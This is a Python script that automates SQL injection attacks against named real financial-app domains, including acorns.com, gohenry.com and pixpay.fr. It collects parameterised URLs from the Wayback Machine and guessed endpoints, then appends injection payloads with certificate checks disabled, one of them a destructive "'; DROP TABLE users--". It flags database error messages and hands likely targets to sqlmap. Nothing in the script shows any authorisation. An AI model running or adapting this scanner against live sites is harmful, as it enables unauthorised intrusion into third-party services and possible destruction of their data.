#!/usr/bin/env python3

import requests
import subprocess
import json
import re
import os
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class QuickSQLScanner:
    def __init__(self):
        self.domains = ['acorns.com', 'gohenry.com', 'pixpay.fr', 'graphql.acorns.com']
        self.all_urls = set()
        self.vulnerable_urls = []
        
    def collect_urls_quick(self):
        """Quick URL collection from multiple sources"""
        print("[+] Quick URL collection starting...")
        
        for domain in self.domains:
            print(f"[+] Collecting URLs for {domain}")
            
            # 1. Wayback Machine (limited)
            try:
                wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=100"
                response = requests.get(wayback_url, timeout=15)
                if response.status_code == 200:
                    data = response.json()
                    for entry in data[1:]:  # Skip header
                        url = entry[2]
                        if url and url.startswith('http') and '?' in url:
                            self.all_urls.add(url)
            except:
                pass
            
            # 2. Common endpoints
            base_url = f"https://{domain}"
            common_endpoints = [
                '/search?q=test',
                '/api/search?query=test',
                '/user?id=1',
                '/product?id=1',
                '/category?id=1',
                '/page?id=1',
                '/account?user_id=1',
                '/profile?id=1',
                '/dashboard?filter=all',
                '/api/users?id=1',
                '/graphql?query=test',
                '/rest/api/v1/search?q=test'
            ]
            
            for endpoint in common_endpoints:
                url = urljoin(base_url, endpoint)
                self.all_urls.add(url)
        
        print(f"[+] Collected {len(self.all_urls)} URLs")
        return list(self.all_urls)
    
    def test_sql_injection_quick(self, url):
        """Quick SQL injection test with basic payloads"""
        print(f"[+] Testing {url}")
        
        # Basic SQL injection payloads
        payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--"]
        
        for payload in payloads:
            try:
                # Inject payload into URL parameters
                if '=' in url:
                    test_url = url + payload
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    # Check for SQL error messages
                    error_patterns = [
                        r'SQL syntax.*MySQL',
                        r'Warning.*mysql_.*',
                        r'valid MySQL result',
                        r'PostgreSQL.*ERROR',
                        r'Warning.*pg_.*',
                        r'valid PostgreSQL result',
                        r'Microsoft.*ODBC.*SQL Server',
                        r'SQLServer JDBC Driver',
                        r'Oracle error',
                        r'Oracle.*Driver',
                        r'Microsoft.*JET Database Engine',
                        r'Access Database Engine'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            return {
                                'url': url,
                                'payload': payload,
                                'vulnerable': True,
                                'error_type': 'SQL Error Message',
                                'evidence': pattern
                            }
                            
            except:
                continue
        
        return None
    
    def test_with_sqlmap_quick(self, url):
        """Quick SQLMap test"""
        try:
            cmd = [
                'sqlmap',
                '-u', url,
                '--batch',
                '--timeout=20',
                '--retries=1',
                '--level=1',
                '--risk=1',
                '--technique=B',
                '--no-cast'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'vulnerable' in result.stdout.lower() or 'injectable' in result.stdout.lower():
                return {
                    'url': url,
                    'tool': 'SQLMap',
                    'vulnerable': True,
                    'output': result.stdout[:500]  # Truncate output
                }
                
        except:
            pass
        
        return None
    
    def run_quick_scan(self):
        """Run quick scan"""
        print("=== Quick SQL Injection Scanner ===")
        print(f"Target domains: {', '.join(self.domains)}")
        
        # Step 1: Collect URLs
        urls = self.collect_urls_quick()
        
        # Step 2: Quick manual tests
        print(f"[+] Testing {len(urls)} URLs with manual payloads...")
        for url in urls:
            result = self.test_sql_injection_quick(url)
            if result:
                self.vulnerable_urls.append(result)
                print(f"[!] VULNERABLE: {url}")
        
        # Step 3: SQLMap tests on promising URLs
        print(f"[+] Testing with SQLMap...")
        test_count = 0
        for url in urls:
            if test_count >= 10:  # Limit SQLMap tests
                break
            if '?' in url and 'id=' in url:  # Focus on ID parameters
                result = self.test_with_sqlmap_quick(url)
                if result:
                    self.vulnerable_urls.append(result)
                    print(f"[!] VULNERABLE: {url}")
                test_count += 1
        
        # Step 4: Save results
        with open('quick_results.json', 'w') as f:
            json.dump({
                'total_urls': len(urls),
                'vulnerable_count': len(self.vulnerable_urls),
                'vulnerable_urls': self.vulnerable_urls,
                'all_urls': list(urls)
            }, f, indent=2)
        
        # Print results
        print(f"\n=== QUICK SCAN RESULTS ===")
        print(f"Total URLs tested: {len(urls)}")
        print(f"Vulnerable URLs found: {len(self.vulnerable_urls)}")
        
        if self.vulnerable_urls:
            print(f"\n=== VULNERABLE URLS ===")
            for vuln in self.vulnerable_urls:
                print(f"- {vuln['url']}")
                if 'payload' in vuln:
                    print(f"  Payload: {vuln['payload']}")
                if 'tool' in vuln:
                    print(f"  Tool: {vuln['tool']}")
        else:
            print("[-] No SQL injection vulnerabilities found in quick scan")
        
        return self.vulnerable_urls

if __name__ == "__main__":
    scanner = QuickSQLScanner()
    scanner.run_quick_scan()